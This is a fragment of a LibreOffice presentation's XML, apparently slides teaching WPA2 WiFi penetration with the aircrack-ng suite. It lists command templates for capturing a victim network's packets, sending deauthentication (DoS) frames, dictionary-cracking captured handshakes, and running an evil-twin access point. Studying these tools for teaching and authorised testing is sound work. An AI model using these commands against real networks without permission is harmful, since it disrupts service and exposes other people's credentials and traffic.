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style:font-name="Times new roma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etwork security penetr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PA2 – aircrack-ng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2">
              <text:list-item>
                <text:p>Airmon-ng – Promescious mode</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>Airodump-ng – Victim and capture packages</text:p>
                <text:p><text:span text:style-name="T1">airodumb−ng −−b s s i d &lt;BSSID&gt; −−c h a n n e l &lt;channel &gt;−w &lt;p a t h F o r S t o r a g i n g P a c k e t s &gt; &lt;i n t e </text:span><text:span text:style-name="T1">r f a c e &gt;</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Aireplay-ng – Deauth/ DoS</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T1">a i r e p l a y −ng −−deauth 1 −a &lt;b s s i d &gt; −−i g n o r e −n e g a t i v e −one &lt;i n t e r f a c e &gt;</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Aircrack-ng</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T1">a i r c r a c k −ng &lt;d a t a F i l e W i t h T r a f f i c &gt; −w / p a t h T o D i c t i o n a r y</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p>PMK – Prepare, prepare, prepar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PA2 – DoS/Evil twin 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Airbase-ng – Evil twin &gt;:)</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T1">a i r b a s e −ng −a &lt;routerMAC&gt; −−e s s i d &lt; e v i l twin&gt; −c &lt;channelOfVictim&gt; i n t e r f a c e</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T1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3:13:23.122503615</meta:creation-date>
    <meta:editing-duration>PT17M37S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2</meta:generator>
    <dc:date>2018-09-19T21:43:46.751225120</dc:date>
    <meta:document-statistic meta:object-count="49"/>
    <meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Alizarin" xlink:href="../../../../../../usr/lib/libreoffice/share/template/common/presnt/Alizarin.otp" meta:date="2018-09-18T13:13:22.9337914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